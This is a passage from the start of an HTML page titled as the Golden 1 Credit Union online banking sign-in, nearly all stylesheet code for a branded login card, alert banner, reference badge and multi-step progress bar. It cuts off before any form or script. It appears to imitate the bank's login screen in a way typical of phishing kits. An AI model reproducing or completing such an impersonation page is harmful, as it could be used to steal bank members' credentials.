<html lang="en">
<head>
<meta charset="UTF-8">

<title>Golden 1 Credit Union | Online Banking Sign In</title>

<style>
  :root{
    --g1-green:#00573F;
    --g1-green-dark:#003F2D;
    --g1-green-deep:#00291D;
    --g1-gold:#C9A227;
    --g1-gold-light:#F4C542;
    --ink:#1B1B1B;
    --muted:#5C6B66;
    --line:#DCE3E0;
    --bg:#F2F5F4;
    --white:#FFFFFF;
    --danger:#B3261E;
    --ok:#1E7B4F;
    --radius:12px;
    --shadow:0 10px 30px rgba(0,41,29,.10), 0 2px 6px rgba(0,41,29,.06);
  }

  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    margin:0;
    font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,"Helvetica Neue",Arial,sans-serif;
    background:var(--bg);
    color:var(--ink);
    -webkit-font-smoothing:antialiased;
    display:flex;
    flex-direction:column;
    min-height:100vh;
  }
  a{color:var(--g1-green);text-decoration:none}
  a:hover{text-decoration:underline}

  /* ---------- TOP BAR ---------- */
  .topbar{
    background:linear-gradient(180deg,var(--g1-green) 0%,var(--g1-green-dark) 100%);
    border-bottom:3px solid var(--g1-gold);
    position:sticky;top:0;z-index:50;
  }
  .wrap{max-width:1080px;margin:0 auto;padding:0 18px}
  .topbar-inner{
    display:flex;align-items:center;justify-content:space-between;
    height:64px;
  }
  .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
  .logo:hover{text-decoration:none}
  .logo-mark{
    width:38px;height:38px;border-radius:9px;
    background:linear-gradient(145deg,var(--g1-gold-light),var(--g1-gold));
    display:flex;align-items:center;justify-content:center;
    font-family:Georgia,"Times New Roman",serif;
    font-weight:700;font-size:24px;color:var(--g1-green-deep);
    box-shadow:inset 0 -2px 0 rgba(0,0,0,.15);
    flex:0 0 auto;
  }
  .logo-text{display:flex;flex-direction:column;line-height:1.05}
  .logo-text strong{
    color:#fff;font-size:19px;letter-spacing:.3px;font-weight:700;
  }
  .logo-text span{
    color:rgba(255,255,255,.72);
    font-size:9.5px;letter-spacing:2.6px;text-transform:uppercase;margin-top:3px;font-weight:600;
  }
  .secure-badge{
    display:flex;align-items:center;gap:7px;
    color:rgba(255,255,255,.85);font-size:12.5px;font-weight:600;letter-spacing:.3px;
  }
  .secure-badge svg{width:15px;height:15px;fill:var(--g1-gold-light)}

  /* ---------- ALERT BANNER ---------- */
  .alert-bar{
    background:#FFF6DC;
    border-bottom:1px solid #EBD9A4;
    padding:11px 0;
  }
  .alert-inner{
    display:flex;gap:11px;align-items:flex-start;
    font-size:13.5px;line-height:1.5;color:#5A4A12;
  }
  .alert-inner .ico{
    flex:0 0 auto;width:20px;height:20px;border-radius:50%;
    background:var(--g1-gold);color:#3A2E05;
    display:flex;align-items:center;justify-content:center;
    font-weight:800;font-size:13px;margin-top:1px;
  }
  .alert-inner strong{color:#3A2E05}

  /* ---------- MAIN ---------- */
  main{flex:1 0 auto;display:flex;align-items:flex-start;justify-content:center;padding:34px 16px 46px}
  .card{
    width:100%;max-width:430px;background:var(--white);
    border-radius:var(--radius);box-shadow:var(--shadow);
    border:1px solid var(--line);overflow:hidden;
    animation:rise .45s cubic-bezier(.2,.8,.3,1) both;
  }
  @keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}

  .card-head{
    padding:24px 26px 0;
  }
  .card-head h1{
    margin:0 0 6px;font-size:21px;font-weight:700;color:var(--g1-green-dark);letter-spacing:-.2px;
  }
  .card-head p{margin:0;font-size:13.5px;color:var(--muted);line-height:1.55}

  .ref{
    display:inline-flex;align-items:center;gap:6px;
    margin-top:12px;padding:5px 10px;border-radius:6px;
    background:#F0F5F3;border:1px solid #DDE7E3;
    font-size:11px;font-weight:700;letter-spacing:.6px;color:#4A5C56;
    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  }
  .ref i{width:6px;height:6px;border-radius:50%;background:var(--g1-gold);display:block}

  /* progress */
  .steps{display:flex;gap:6px;padding:18px 26px 0}
  .steps .bar{height:4px;flex:1;border-radius:99px;background:#E4EAE8;overflow:hidden}
  .steps .bar span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--g1-green),#0A8A63);transition:width .45s ease}
  .steps .bar.done span,.steps .bar.active span{width:100%}
  .steps .bar.active span{background:linear-gradient(90deg,var(--g1-green),var(--g1-gold))}

  .card-body{padding:22px 26px 26px}

  /* fields */
  .field{margin-bottom:16px}
  .field label{
    display:block;font-size:12.5px;font-weight:700;color:#33443E;
    margin-bottom:7px;letter-spacing:.15px;
  }
  .field .hint{font-weight:500;color:#87968F;font-size:11.5px}
  .control{position:relative}
  .control input{
    width:100%;height:50px;padding:0 14px;
    font-size:16px;
